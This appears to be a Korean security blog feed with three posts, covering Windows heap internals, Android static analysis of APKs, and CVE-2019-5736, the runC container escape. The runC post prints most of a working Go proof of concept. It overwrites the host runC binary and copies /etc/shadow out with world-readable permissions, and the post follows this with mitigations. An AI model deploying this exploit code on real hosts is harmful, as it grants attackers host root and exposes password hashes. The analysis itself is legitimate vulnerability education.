&lt;p&gt;이 Process Heap은 Process 시작 시에 생성되고(기본 크기는 1MB) Process가 종료될 때까지 없어지지 않는 특징이 있습니다.&lt;/p&gt;

&lt;p&gt;흔히 사용하는 malloc, new는 Process Heap에서 할당하는 것입니다.&lt;/p&gt;

&lt;p&gt;이 기본 Heap은 프로그램 내에서 명시적으로 사용될 수도 있고 윈도우 내부 함수에 의해 암묵적으로 사용될 수도 있는데 프로그램에서 GetProcessHeap을 이용해 기본 Process Heap을 구할 수 있습니다.&lt;/p&gt;

&lt;p&gt;요약을 해보자면, Process가 시작되면 기본 Heap이 생성된다는 것과 malloc, new를 이용해서 아래 그림처럼 Heap을 할당받아 사용한다는 것입니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x0a_1.png&quot; alt=&quot;[그림 1-1]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;지금까지 기본 Heap에 대한 설명을 했는데요,&lt;/p&gt;

&lt;p&gt;지금부터는 위 그림처럼 하나만 할당받는 것이 아닌 다양한 크기의 Heap 공간을 반복적으로 할당/해제하는 경우를 한 번 생각해보겠습니다.&lt;/p&gt;

&lt;h5 id=&quot;heap-fragmentation&quot;&gt;Heap Fragmentation&lt;/h5&gt;

&lt;p&gt;사용자가 Heap 공간을 쓰기 위해 할당을 요청하면 사용가능한 “연속된” 공간이 할당됩니다.&lt;/p&gt;

&lt;p&gt;그런데 다양한 크기의 Heap 공간을 요청하고 해제한다고 생각해봅시다.&lt;/p&gt;

&lt;p&gt;분명 할당받은 순서대로 해제하지는 않겠죠?&lt;/p&gt;

&lt;p&gt;정해진 순서없이 다양한 크기의 Heap이 할당되고 해제된다면, 아래 그림처럼 특정 순간에는 원하는 크기의 Heap을 할당해줄 수 없는 순간이 올 겁니다.&lt;/p&gt;

&lt;p&gt;이를 Heap Fragmentation(힙 단편화)이라고 합니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x0a_2.png&quot; alt=&quot;[그림 1-2]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;위 그림에서 보듯, 남은 메모리 용량의 총합은 할당을 원하는 객체의 크기보다 크지만 연속된 공간을 할당해 줄 수 없는 상황이 옵니다.&lt;/p&gt;

&lt;p&gt;윈도우는 이러한 단편화 문제를 해결하기 위해서 특별한 방식들을 사용하고 있습니다.&lt;/p&gt;

&lt;p&gt;이 방식들을 살펴보면서 Heap에 대한 이해를 더 높여보겠습니다.&lt;/p&gt;

&lt;h5 id=&quot;free-list&quot;&gt;Free List&lt;/h5&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x0a_3.png&quot; alt=&quot;[그림 1-3]&quot; /&gt;
&lt;/figure&gt;
&lt;center&gt;http://www.slideshare.net/ffri/mr201312-history-and-current-state-of-heap-exploit-eng&lt;/center&gt;

&lt;p&gt;Free List란 말 그대로 해제된 Heap 메모리들을 담아두는 List입니다.&lt;/p&gt;

&lt;p&gt;어떤 메모리를 할당해서 사용하고 난 뒤, 해제를 하면 그 메모리는 Free List에 들어가게 됩니다.&lt;/p&gt;

&lt;p&gt;그리고 다음 메모리를 할당하려고 하면 Heap 공간을 바로 쓰게 해주는 것이 아니라 Free List를 먼저 살펴봅니다.&lt;/p&gt;

&lt;p&gt;Free List에 적합한 크기의 Heap 메모리가 있을 경우는 해당 메모리를 할당해줍니다.&lt;/p&gt;

&lt;p&gt;만약 적절한 크기의 메모리가 없다면 요청한 크기만큼의 Heap을 새로 할당해주는 방식입니다.&lt;/p&gt;

&lt;p&gt;예를 들어, 프로그램이 시작된 후 처음으로 0x20 크기의 Heap을 요청했다고 가정하겠습니다.&lt;/p&gt;

&lt;p&gt;해제된 메모리가 없으니 Free List는 비어있겠죠?&lt;/p&gt;

&lt;p&gt;그럼 Heap의 할당은 다음 그림처럼 이루어집니다.&lt;/p&gt;

&lt;p&gt;(실제로는 0x20 + Heap Header 크기만큼 할당이 이루어집니다.)&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x0a_4.png&quot; alt=&quot;[그림 1-4]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;그런 다음 이 메모리를 해제하게 되면 이 메모리는 Free List에 들어가게 됩니다.&lt;/p&gt;

&lt;p&gt;이후 프로그램이 다시 0x30 크기의 Heap을 요청하면 Free List를 먼저 살펴봅니다.&lt;/p&gt;

&lt;p&gt;0x30을 할당할 수 있을 만한 크기가 없기 때문에 새로 0x30만큼의 메모리를 할당해줍니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x0a_5.png&quot; alt=&quot;[그림 1-5]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;이번에는 0x10만큼의 메모리 할당 요청이 들어왔다고 가정하겠습니다.&lt;/p&gt;

&lt;p&gt;이번에도 Heap 관리자는 Free List를 먼저 살펴보겠지요?&lt;/p&gt;

&lt;p&gt;Heap 관리자는 Best-Fit 정책을 사용하고 있기 때문에 최대한 적합한 크기의 Heap을 할당하려고 합니다.&lt;/p&gt;

&lt;p&gt;지금 상황에서는 0x30이 제일 적합한 메모리가 되겠네요.&lt;/p&gt;

&lt;p&gt;이 0x30 메모리를 모두 할당하는 것이 아니라 메모리를 분할하여 0x10만큼만 할당을 해줍니다.&lt;/p&gt;

&lt;p&gt;그런데 이런 방식을 사용하는 환경에서 작은 메모리 요청/해제가 빈번하게 일어나면 어떻게 될까요?&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x0a_2.png&quot; alt=&quot;[그림 1-2]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;작은 메모리 조각이 계속해서 발생할 것이고 이를 관리하는 것에 한계가 생길 겁니다.&lt;/p&gt;

&lt;p&gt;이런 현상을 개선하기 위해서 최신 윈도우에서는 Low Fragmentation Heap이라는 정책을 도입했습니다.&lt;/p&gt;

&lt;h5 id=&quot;low-fragmentation-heap&quot;&gt;Low Fragmentation Heap&lt;/h5&gt;

&lt;p&gt;Low Fragmentation Heap(저단편화 힙)은 말 그대로 위에서 살펴본 Free List 방식에서 발생하는 단편화 현상을 줄이기 위해 도입되었습니다.&lt;/p&gt;

&lt;p&gt;Free List에서는 Heap을 계속해서 분할하는 방식이기 때문에 단편화 문제가 있다고 했었죠?&lt;/p&gt;

&lt;p&gt;그래서 Low Fragmentation Heap은 Bucket이라는 미리 정의된 서로 다른 크기의 범위를 갖는 블록을 관리함으로써 단편화를 해결합니다.&lt;/p&gt;

&lt;p&gt;쉽게 이야기해서, 미리 여러 크기로 Heap 공간을 분할해놓고 할당 요청이 오면 해당 크기를 포함하는 가장 작은 Bucket을 선택해 할당합니다.&lt;/p&gt;

&lt;p&gt;Bucket은 총 128개인데 첫 번째 Bucket은 1~8바이트, 두 번째는 9~16바이트 식으로 8바이트 단위로 구분되며, 마지막 Bucket은 15873~16384 바이트 크기까지 지원할 수 있습니다.&lt;/p&gt;

&lt;p&gt;만약 요청된 크기가 16384 바이트보다 크다면 Backend로 요청을 보냅니다.&lt;/p&gt;

&lt;p&gt;Backend로 요청이 이루어지면 Free List 방식으로 Heap 할당을 진행합니다.&lt;/p&gt;

&lt;p&gt;즉, Low Fragmentation Heap 기법은 미리 Bucket으로 나누어서 적합한 메모리를 찾는 속도를 증가시키고, 크기별 Free List들을 Lookaside List에 나누어 관리하는 것이죠.&lt;/p&gt;

&lt;p&gt;지금까지 Windows Heap 대해 알아봤습니다.&lt;/p&gt;

&lt;p&gt;다음 시간부터는 Heap에 대한 공격 기법을 살펴보도록 하겠습니다.&lt;/p&gt;</content><author><name>Joel Park</name></author><category term="Posts" /><summary type="html">0x0a Windows-Heap</summary></entry><entry><title type="html">android-0x01</title><link href="http://localhost:4000/android-0x01" rel="alternate" type="text/html" title="android-0x01" /><published>2019-03-29T14:00:00+09:00</published><updated>2019-03-29T14:00:00+09:00</updated><id>http://localhost:4000/android-0x01</id><content type="html" xml:base="http://localhost:4000/android-0x01">&lt;h1 id=&quot;android-정적-분석&quot;&gt;Android 정적 분석&lt;/h1&gt;

&lt;p&gt;안녕하세요 chaem 입니다.&lt;/p&gt;

&lt;p&gt;지난 포스팅에 이어서 이번에는 Android 정적 분석에 대해 포스팅 하려고 합니다.&lt;/p&gt;

&lt;p&gt;Android 정적 분석은 크게 2가지로 분류할 수 있습니다.&lt;/p&gt;

&lt;h4 id=&quot;-압축-해제-후-분석&quot;&gt;-압축 해제 후 분석&lt;/h4&gt;
&lt;p&gt;첫째로 Android 앱은 .apk 파일 확장자를 가지며, 압축된 형태이므로 압축을 해제한 후 해당 파일을 분석하는 방법입니다.&lt;/p&gt;

&lt;p&gt;아래 그림과 같이 apk 파일을 압축 해제하면 class.dex 파일이 생성되는 것을 확인할 수 있습니다.&lt;/p&gt;
&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/mobile/0x01/01.png&quot; alt=&quot;[그림 1-1]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;이 class.dex 파일을 dex -&amp;gt; jar -&amp;gt; java 로 decompile 하면 소스코드를 확인 할 수 있습니다.&lt;/p&gt;

&lt;p&gt;우선 dex2jar를 이용하여 dex -&amp;gt; jar로 decompile 합니다.&lt;/p&gt;
&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/mobile/0x01/02.png&quot; alt=&quot;[그림 1-2]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;jar 파일은 jd-gui를 이용해 decompile하여 소스코드를 확인할 수 있으며, 아래와 같이 난독화가 적용되어 있지 않으면 소스코드 분석을 통해 루팅 탐지 우회 등이 가능합니다.&lt;/p&gt;
&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/mobile/0x01/03.png&quot; alt=&quot;[그림 1-3]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;아래와 같이 jadx-gui를 이용하면 apk 파일을 바로 java 소스 코드로 확인할 수 있는 방법도 있습니다.&lt;/p&gt;
&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/mobile/0x01/04.png&quot; alt=&quot;[그림 1-4]&quot; /&gt;
&lt;/figure&gt;

&lt;h4 id=&quot;-decompile-후-분석&quot;&gt;-Decompile 후 분석&lt;/h4&gt;
&lt;p&gt;두번째는 apk파일을 decompile한 후 해당 파일을 분석하는 방법입니다.&lt;/p&gt;

&lt;p&gt;apktool을 이용하면 아래 그림과 같이 apk 파일이 decompile되는 것을 확인할 수 있습니다.
주요 분석 대상은 AndroidManifest 파일,  smali 코드, lib 폴더 등이 있습니다.&lt;/p&gt;
&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/mobile/0x01/05.png&quot; alt=&quot;[그림 1-5]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;AndroidManifest.xml 파일은 해당 앱에 대한 권한 등의 필수적인 정보를 포함하고 있으며, 앱에서 불필요한 권한을 요청하고 있는지 확인해보아야 합니다.&lt;/p&gt;
&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/mobile/0x01/06.png&quot; alt=&quot;[그림 1-6]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;smali 코드는 An assembler/disassembler for Android’s dex format의 약자로 코드 분석을 통해 실행 원리를 파악할 수 있습니다. 따라서 코드 수정 후 리패키징을 통해 앱 변조가 가능합니다.&lt;/p&gt;
&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/mobile/0x01/07.png&quot; alt=&quot;[그림 1-7]&quot; /&gt;
&lt;/figure&gt;
&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/mobile/0x01/08.png&quot; alt=&quot;[그림 1-8]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;lib 폴더 내에는 동적라이브러리인 *.so 파일을 포함하며, 보통 보안 솔루션들이 동적 라이브러리로 존재하고 있습니다. 아래 그림과 같이 IDA를 통해 분석이 가능하며, 보안 솔루션에서 루팅을 탐지하는 로직을 확인할 수 있습니다.&lt;/p&gt;
&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/mobile/0x01/09.png&quot; alt=&quot;[그림 1-9]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;지금까지 Android 정적 분석에 대해 알아보았고, 다음 포스팅에서는 Android 동적 분석에 대해 알아보도록 하겠습니다.&lt;/p&gt;

&lt;p&gt;감사합니다.&lt;/p&gt;</content><author><name>Chaem</name></author><category term="Posts" /><summary type="html">Android 정적 분석</summary></entry><entry><title type="html">CVE-2019-5736 (runC Container 취약점)</title><link href="http://localhost:4000/runC-Container" rel="alternate" type="text/html" title="CVE-2019-5736 (runC Container 취약점)" /><published>2019-03-28T02:43:00+09:00</published><updated>2019-03-28T02:43:00+09:00</updated><id>http://localhost:4000/runC%20Container</id><content type="html" xml:base="http://localhost:4000/runC-Container">&lt;h2 id=&quot;cve-2019-5736-runc-container-취약점&quot;&gt;CVE-2019-5736 (runC Container 취약점)&lt;/h2&gt;

&lt;p&gt;안녕하세요. Sulla임돠!&lt;/p&gt;

&lt;p&gt;2월 11일 &lt;strong&gt;docker&lt;/strong&gt;관련 런타임인 &lt;strong&gt;runC&lt;/strong&gt; 관련 취약점 &lt;strong&gt;CVE-2019-5736&lt;/strong&gt; 공개 되었습니다. 
공개된지 1주일도 안지나 &lt;strong&gt;POC&lt;/strong&gt;가 공개되고 있으며, 영향력도 큰 취약점으로 많은 주목을 받고있습니다.&lt;/p&gt;

&lt;p&gt;그래서 이번 포스팅에서는 해당 취약점에 대하여 리뷰해 보겠습니다.&lt;/p&gt;

&lt;h2 id=&quot;본-포스팅에서는-환경-구축버전-등의-정보는-제외하겠습니다&quot;&gt;[&lt;strong&gt;본 포스팅에서는 환경 구축/버전 등의 정보는 제외하겠습니다.]&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;먼저 &lt;strong&gt;docker&lt;/strong&gt;가 뭔지…&lt;strong&gt;runC&lt;/strong&gt;가 뭔지에 대해서 알아야겠죠??언제나 그렇듯 최대한 간단하고 필요한 내용만 쉽게 알아보겠습니다.(&lt;strong&gt;귀차니즘&lt;/strong&gt; 아닙니다…..)&lt;/p&gt;

&lt;p&gt;우선 &lt;strong&gt;docker&lt;/strong&gt;란 &lt;strong&gt;Linux&lt;/strong&gt; 기반의 &lt;strong&gt;container runtime 오픈소스 플랫폼&lt;/strong&gt; 입니다. 쉽게 말해 &lt;strong&gt;Container 관리 플랫폼&lt;/strong&gt;이며, &lt;strong&gt;VM&lt;/strong&gt;(Virtual Machine)과 비슷한 역할을 수행하지만 쉬운 배포 및 높은 확장성 등의 &lt;strong&gt;접근성&lt;/strong&gt;과 메모리 점유등의 &lt;strong&gt;성능&lt;/strong&gt;의 차이를 보입니다.(“&lt;strong&gt;가상화&lt;/strong&gt;“가 목표이긴 합니다.)&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/jobs/runC_Container/5736-1.png&quot; alt=&quot;[그림 5736-1]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;Docker의 기본 구성을 위 그림과 같이 표현했습니다. 각각의 역할을 알아 보겠습니다.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Docker Engine : 사용자와 상호작용을 합니다.&lt;/li&gt;
  &lt;li&gt;Containerd : 직/간접적으로 호스트에서 컨테이너 전체 라이프 사이클을 관리합니다. (이미저 전송 및 저장, 컨테이너 실행 및 관리(runC 사용), 네트워크 인터페이스 관리 등)&lt;/li&gt;
  &lt;li&gt;Containerd-shim : runC를 사용해 컨테이너를 시작된 후에 runC가 종료 되어도 컨테이너가 실행 되도록합니다.&lt;/li&gt;
  &lt;li&gt;runC : 컨테이너를 실행하는 런타임이며, CLI 툴 입니다. (리눅스 커널 네임스페이스, Cgroups(프로세스의 자원 사용을 제한하는 커널 기능), Seccomp(리눅스 커널에서 샌드 박싱 메커니즘을 제공하는 보안 기능), 리눅스 보안 모듈 등)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;기본 구성 및 역할에 대하여 알아봤고 &lt;strong&gt;CVE-2019-5736&lt;/strong&gt; 취약점에 직접적인 영향을 미치는 runC에 대해서 알아 보겠습니다.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;runC&lt;/strong&gt;는 &lt;strong&gt;container&lt;/strong&gt;의 &lt;strong&gt;생성/실행&lt;/strong&gt; 등을 위한 기본적인 기술이며 &lt;strong&gt;CLI&lt;/strong&gt; 도구입니다. 즉, &lt;strong&gt;container&lt;/strong&gt;의 &lt;strong&gt;조작&lt;/strong&gt;을 위해 존재 한다고 생각하면 될 것 같습니다. &lt;strong&gt;runC&lt;/strong&gt;는 Docker, containerd, Podman 및 CRI-O가있는 &lt;strong&gt;컨테이너의 기본 런타임&lt;/strong&gt;으로 사용됩니다.&lt;/p&gt;

&lt;p&gt;그럼 이번 포스팅의 주인공인 &lt;strong&gt;CVE-2019-5736&lt;/strong&gt;에 대해서 알아보겠습니다.&lt;/p&gt;

&lt;h1 id=&quot;cve-2019-5736&quot;&gt;CVE-2019-5736&lt;/h1&gt;

&lt;p&gt;해당 취약점은 위에서 알아본 &lt;strong&gt;runC&lt;/strong&gt;에서 발생하는 취약점입니다. &lt;strong&gt;**컨테이너 내부에서 **루트 권한&lt;/strong&gt;으로 악의적인 프로세스를 실행할 경우 &lt;strong&gt;runC 버그&lt;/strong&gt;를 이용하여 컨테이터를 실행하는 &lt;strong&gt;호스트에 대한 루트 권한&lt;/strong&gt;을 탈취하는 취약점입니다. 따라서, 서버에 대한 접근 및 해당 서버의 다른 컨테이너 또한 접근이 가능합니다.&lt;/p&gt;

&lt;p&gt;쉽게 말해 &lt;strong&gt;악성 컨테이너&lt;/strong&gt;를 통해 &lt;strong&gt;호스트 서버의 루트 권한 탈취&lt;/strong&gt;가 가능하게 됩니다.&lt;/p&gt;

&lt;p&gt;해당 취약점의 트리거 방법은 다음중 하나 입니다.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;컨테이너 내부의 악성 프로세스 실행(루트로 실행되는 )&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;악성 docker 이미지를 실행&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;해당 취약점을 트리거 하기 위해서는 위에서도 언급했 듯 &lt;strong&gt;컨테이너 내부&lt;/strong&gt;에 &lt;strong&gt;루트 권한&lt;/strong&gt;이 있어야 합니다.&lt;/p&gt;

&lt;p&gt;화면 구성은 위쪽은 &lt;strong&gt;Host Server&lt;/strong&gt;, 아래쪽은 &lt;strong&gt;Container&lt;/strong&gt; 입니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/jobs/runC_Container/5736-2.png&quot; alt=&quot;[그림 5736-2]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;진행 자체는 굉장히 간단하게 진행됩니다.(물론 저는 삽질 했습니다……Aㅏ…..) 먼저 &lt;strong&gt;Host Server&lt;/strong&gt;쪽에 해당 파일이 없음을 확인 합니다. 후에는 컨테이너에서 악성 파일을 실행하면 준비가 끝납니다. 함정 처럼 &lt;strong&gt;/bin/sh&lt;/strong&gt;를 &lt;strong&gt;#!/proc/self/exe&lt;/strong&gt; 바꿔놓고 기다리는 단계입니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/jobs/runC_Container/5736-3.png&quot; alt=&quot;[그림 5736-3]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;그리고 호스트가 컨테이너쪽으로  &lt;strong&gt;docker exec&lt;/strong&gt; 명령을 통해 &lt;strong&gt;/bin/sh&lt;/strong&gt;의 실행을 명하게 되면 위에서 설치해뒀던 함정이 발동하게 됩니다. 함정 카드….. &lt;strong&gt;(/bin/sh를 쓸것이라 추측하고 세팅 하는겁니다.)&lt;/strong&gt; 
다음으로 &lt;strong&gt;runC&lt;/strong&gt;의 &lt;strong&gt;PID&lt;/strong&gt;를 찾고 &lt;strong&gt;핸들링(O_PATH ,O_WRONLY 플래그 사용)&lt;/strong&gt;을 위한 여러 과정을 거치고 최종적으로 호스트의 &lt;strong&gt;runC&lt;/strong&gt; 바이너리 파일을 &lt;strong&gt;악성 runC&lt;/strong&gt; 로 변조되며 악성 파일에 미리 정의 되있던 행위를 &lt;strong&gt;호스트&lt;/strong&gt;쪽에서 &lt;strong&gt;루트 권한&lt;/strong&gt;으로 수행하게 됩니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/jobs/runC_Container/5736-4.png&quot; alt=&quot;[그림 5736-4]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;처음에는 없던 shadow 파일이 root 권한으로 생성된 것을 확인할 수 있습니다. 해당파일을 열람시 실제 shadow 파일임을 확인 가능합니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/jobs/runC_Container/5736-5.png&quot; alt=&quot;[그림 5736-5]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;위 과정을 거치면서 &lt;strong&gt;Host Server&lt;/strong&gt;쪽의 runC 파일이 변조됩니다. 해쉬값을 비교하면 쉽게 확인 가능하며 위쪽 해쉬값이 원본이면 아래쪽은 변조된 runC 바이너리의 해쉬값입니다.&lt;/p&gt;

&lt;p&gt;두 번째 방법의 경우는 첫 번쨰와 원리는 같으며 차이점은 악성 docker 이미지를 생성해서 배포하고 피해자는 해당 이미지를 다운받아 실행하게 되면 위에서와 같은 일련의 동작들을 수행하게 됩니다.&lt;/p&gt;

&lt;p&gt;보신것처럼 &lt;strong&gt;Container&lt;/strong&gt; 쪽에서 &lt;strong&gt;Host Server&lt;/strong&gt;의 &lt;strong&gt;root&lt;/strong&gt; 권한으로 악의적인 행위가 가능한 취약점입니다.&lt;/p&gt;

&lt;p&gt;어쩌다 이런 일이 생기는지 코드를 보면서 확인 해보겠습니다. (해당 poc코드는 go로 작성 되었습니다.)&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;var payload = &quot;#!/bin/bash \n cat /etc/shadow &amp;gt; /tmp/shadow &amp;amp;&amp;amp; chmod 777 /tmp/shadow&quot;

func main() {
	fd, err := os.Create(&quot;/bin/sh&quot;)
	if err != nil {
		fmt.Println(err)
		return
	}
	fmt.Fprintln(fd, &quot;#!/proc/self/exe&quot;)
	err = fd.Close()
	if err != nil {
		fmt.Println(err)
		return
	}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;우선 &lt;strong&gt;Container&lt;/strong&gt;에서 악성 프로세스를 실행하게 되면 위 코드가 실행됩니다.&lt;/p&gt;

&lt;p&gt;1라인의 행위를 위해 아래의 코드들이 쭉 진행됩니다.&lt;/p&gt;

&lt;p&gt;코드의 4라인에서 /bin/sh 를 생성 하고 fd에 저장 합니다. 다음으로 9라인에서 #!/proc/self/exe를 fd에 저장 합니다. Fprintln()함수는 첫 번째 인자에 두 번째 인자를 전달하는 기능을 수행 합니다. 첫 번째 인자인 fd는 /bin/sh이며 여기에 /proc/self/exe가 저장 되겠죠.&lt;/p&gt;

&lt;p&gt;위 코드의 동작을 해석 하자면 9라인의 &lt;strong&gt;#!/proc/self/exe(&lt;/strong&gt;해당 프로세스를 위해 실행된 바이너리를 가리키는 모든 프로세스에 대한 &lt;strong&gt;커널&lt;/strong&gt;이 만든 &lt;strong&gt;심볼릭 링크&lt;/strong&gt;입니다.&lt;strong&gt;)&lt;/strong&gt;는 현재 실행된 프로세스를 어떤놈이 실행 시켰는지에 대해 가리킵니다. 현재 실행된 프로세스는 Host에 의해서 실행된 /bin/sh 이죠. 따라서 /bin/sh을 실행 시킨놈은 Host의 &lt;strong&gt;runC&lt;/strong&gt;입니다.
다시 정리 해본다면, Host에서 Container의 /bin/sh을 &lt;strong&gt;docker exec&lt;/strong&gt;를 통해 실행 하는데 이 때 &lt;strong&gt;runC&lt;/strong&gt;가 사용 됩니다. 결국 &lt;strong&gt;#!/proc/self/exe&lt;/strong&gt;가 가리키는 놈은 &lt;strong&gt;Host의 runC&lt;/strong&gt;가 되고 &lt;strong&gt;/bin/sh&lt;/strong&gt;는 결국 Host의 &lt;strong&gt;runC&lt;/strong&gt;가 됩니다.
여기가 &lt;strong&gt;CVE-2019-5736&lt;/strong&gt; 취약점의 주요 원인이라 판단이 됩니다. &lt;strong&gt;/proc/self/exe&lt;/strong&gt;가 가리키는 것에 대해서 &lt;strong&gt;부적절하게 처리함&lt;/strong&gt;으로서 위와 같은 행위가 가능해 지는것이죠.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;var found int
	for found == 0 {
		pids, err := ioutil.ReadDir(&quot;/proc&quot;)
		if err != nil {
			fmt.Println(err)
			return
		}
		for _, f := range pids {
			fbytes, _ := ioutil.ReadFile(&quot;/proc/&quot; + f.Name() + &quot;/cmdline&quot;)
			fstring := string(fbytes)
			if strings.Contains(fstring, &quot;runc&quot;) {
				fmt.Println(&quot;[+] Found the PID:&quot;, f.Name())
				found, err = strconv.Atoi(f.Name())
				if err != nil {
					fmt.Println(err)
					return
				}
			}
		}
	}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;다음 코드에서는 runC가 구동 되는 동안 runC를 덮어쓸 수 없기 때문에 이를 해결 하기위한 코드가 짜여져 있는데 이 때 필요한 &lt;strong&gt;runC의 PID를 찾기위한 코드&lt;/strong&gt;입니다. /proc/[PID]/cmdline(해당 PID를 갖는 프로세스가 어떤 command로 실행 되었는지를 나타냅니다.)에 있는 모든 파일에서 runC를 찾고 결과적으로 runC의 PID를 확보 합니다.
즉, 모든 PID를 대상으로 어떤 친구가 runC를 실행 했는지 찾아 내는 과정입니다.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;var handleFd = -1
	for handleFd == -1 {
		handle, _ := os.OpenFile(&quot;/proc/&quot;+strconv.Itoa(found)+&quot;/exe&quot;, os.O_RDONLY, 0777)
		if int(handle.Fd()) &amp;gt; 0 {
			handleFd = int(handle.Fd())
		}
	}
	fmt.Println(&quot;[+] Successfully got the file handle&quot;)

	for {
		writeHandle, _ := os.OpenFile(&quot;/proc/self/fd/&quot;+strconv.Itoa(handleFd), os.O_WRONLY|os.O_TRUNC, 0700)
		if int(writeHandle.Fd()) &amp;gt; 0 {
			fmt.Println(&quot;[+] Successfully got write handle&quot;, writeHandle)
			writeHandle.Write([]byte(payload))
			return
		}
	}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;다음 코드에서는 위에서 찾아낸 runC의 PID값을 이용해 파일 핸들을 얻어냅니다. 이 핸들을 이용해 &lt;strong&gt;/proc/self/fd/파일 서술자&lt;/strong&gt;의 &lt;strong&gt;파일 핸들&lt;/strong&gt;을 얻습니다. 해당 파일 핸들을 유지하며 Host의 runC를 악성 runC로 바꾸는 등의 권한을 얻게 됩니다.&lt;/p&gt;

&lt;p&gt;위에서의 과정에서 보이듯 &lt;strong&gt;rudC&lt;/strong&gt;의 &lt;strong&gt;파일 서술자(/proc/self/exe)&lt;/strong&gt;에 대한 처리 미흡으로 권한 상승이 가능해지는 취약점입니다.&lt;/p&gt;

&lt;h1 id=&quot;대응-방법&quot;&gt;대응 방법&lt;/h1&gt;

&lt;p&gt;취약점의 동작 조건중 하나는 &lt;strong&gt;Container&lt;/strong&gt;에의 &lt;strong&gt;root&lt;/strong&gt;권한이 있어야 합니다. 또한 &lt;strong&gt;출처를 알 수 없는 이미지&lt;/strong&gt;를 무분별하게 사용시에도 공격 시나리오가 생길것입니다. 
전부는 아니지만 대부분의 Cloud Container system이 &lt;strong&gt;CVE-2019-5736&lt;/strong&gt; 취약할 것 입니다.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;strong&gt;Container root 권한 제한&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;신뢰할 수 없는 이미지 파일 사용 자제&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;runC 등 최신 버전 유지&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;컨테이너 시작 시 호출되는 바이너리의 임시 백업 바이너리 생성&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;…….&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;해당 취약점에 영향을 받는 여러 업체들(Red Hat, runC 관리자, google, Amazon, Docker, debian, ubuntn 등등)은 취약 runC 버전에 대해서 업데이트 한 이미지를 배포중입니다.&lt;/p&gt;

&lt;p&gt;영어 해석에 재능이 부족하여 틀린 내용이 있다면 알려주시기 바랍니다 :)&lt;/p&gt;

&lt;p&gt;감사합니다.&lt;/p&gt;

